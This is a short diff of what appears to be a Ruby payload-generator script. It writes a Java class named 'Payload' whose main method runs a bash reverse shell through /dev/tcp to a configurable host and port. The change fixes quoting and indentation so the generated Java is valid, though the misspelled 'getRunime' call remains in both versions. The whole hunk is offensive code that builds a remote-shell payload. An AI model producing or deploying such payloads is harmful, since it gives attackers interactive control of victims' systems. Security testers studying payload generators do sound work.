@@ -61,12 +61,12 @@ begin
         f.puts "import java.io.IOException;"
         f.puts "public class Payload"
         f.puts "{"
-	      f.puts "    public static void main(String[] args)"
-	      f.puts "    {
-		    f.puts "        Process proc = Runtime.getRunime().exec("#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &");
-		    f.puts "        proc.waitFor();"
-		    f.puts "        proc.destroy();
-	      f.puts "    }"
+	f.puts "    public static void main(String[] args)"
+	f.puts "    {"
+	f.puts "        Process proc = Runtime.getRunime().exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+	f.puts "        proc.waitFor();"
+	f.puts "        proc.destroy();"
+	f.puts "    }"
         f.puts "}"
     }
     puts "#{s}Saved to #{file}!"
